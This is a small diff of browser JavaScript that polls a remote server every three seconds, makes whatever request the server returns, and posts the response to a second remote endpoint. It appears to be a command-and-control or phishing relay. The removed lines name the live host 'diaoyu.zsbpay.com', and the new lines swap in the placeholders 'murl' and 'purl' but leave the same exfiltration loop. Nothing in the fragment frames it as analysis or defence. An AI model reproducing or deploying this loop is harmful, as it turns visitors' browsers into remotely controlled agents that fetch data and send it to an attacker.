@@ -12,7 +12,7 @@
 	setInterval(execute,3000);
 	function execute(){
 		new ajax({
-			url:'https://diaoyu.zsbpay.com/url.php',
+			url:'murl',
 			type:'post',
 			data:'null',
 			success:function(data){
@@ -30,7 +30,7 @@
 			data:data.data,
 			success:function(res){
 				new ajax({
-					'url':'https://diaoyu.zsbpay.com/p.php',
+					'url':'purl',
 					'type':'post',
 					'data':res
 				});
